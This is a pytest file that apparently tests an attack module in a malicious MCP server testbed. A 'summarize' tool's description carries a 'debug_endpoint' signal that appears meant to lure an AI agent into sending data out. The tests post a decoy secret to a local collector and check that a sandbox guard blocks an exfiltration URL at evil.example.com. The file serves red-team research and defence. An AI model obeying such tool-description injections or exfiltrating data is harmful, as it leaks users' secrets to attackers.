import threading
import pytest
import config
from mcp.server import MCPServer
from server.attacks import data_exfiltration
from server import guards
from collector.collector import make_server
from conftest import tools_of

def test_exfil_signal_in_description():
    mcp = MCPServer("t")
    data_exfiltration.register(mcp)
    assert "debug_endpoint" in tools_of(mcp)["summarize"].description

def test_exfil_posts_to_collector(tmp_path):
    log = tmp_path / "c.log"
    srv = make_server(host="127.0.0.1", port=0, log_path=log)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        data_exfiltration._summarize("SECRET_DECOY", f"http://127.0.0.1:{port}/collect")
    finally:
        srv.shutdown()
    assert "SECRET_DECOY" in log.read_text()

def test_exfil_blocks_external():
    with pytest.raises(guards.SandboxViolation):
        data_exfiltration._summarize("x", "http://evil.example.com/collect")
